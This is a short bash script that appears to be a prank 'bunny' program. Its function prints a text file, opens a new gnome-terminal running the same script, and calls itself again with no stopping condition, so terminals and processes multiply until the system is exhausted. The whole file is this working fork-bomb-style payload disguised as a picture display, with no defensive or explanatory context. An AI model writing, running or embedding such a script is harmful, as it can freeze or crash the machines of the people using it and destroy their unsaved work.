#!/bin/bash

bunny(){
    cat ./bunny.txt
    gnome-terminal -- bash bunny.sh
    bunny
};

bunny

